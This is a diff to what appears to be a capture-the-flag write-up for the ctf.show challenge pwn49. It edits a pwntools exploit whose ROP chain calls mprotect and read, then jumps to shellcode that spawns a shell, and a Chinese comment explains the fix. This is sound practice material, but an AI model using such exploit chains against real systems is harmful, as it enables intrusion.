@@ -920,7 +920,7 @@ size 适当大小就可以 只要够读入shellcode就可以，设置大点无�
 ```python
 from pwn import *
 context(os = 'Linux', arch = 'i386', log_level = 'debug')
-r = remote('pwn.challenge.ctf.show', 28228)
+r = remote('pwn.challenge.ctf.show', 28167)
 
 elf = ELF('./pwn49')
 mprotect = elf.sym['mprotect']
@@ -934,7 +934,7 @@ rfp = 0  # read_first_parameter
 rsp = mfp  # second_second_parameter
 rtp = msp  # third_third_parameter
 
-payload = cyclic(0x12 + 0x4) + p32(mprotect) + p32(popebx_esi_ebp) + p32(mfp) + p32(msp) + p32(mtp) + p32(read) + p32(popebx_esi_ebp) + p32(rfp) + p32(rsp) + p32(rtp)
+payload = cyclic(0x12 + 0x4) + p32(mprotect) + p32(popebx_esi_ebp) + p32(mfp) + p32(msp) + p32(mtp) + p32(read) + p32(popebx_esi_ebp) + p32(rfp) + p32(rsp) + p32(rtp) + p32(mfp)  # 这里再加一个mfp是为了最后运行这块的shellcode,因为之前的只是读入shellcode却没有执行
 r.sendline(payload)
 
 shellcode = asm(shellcraft.sh())
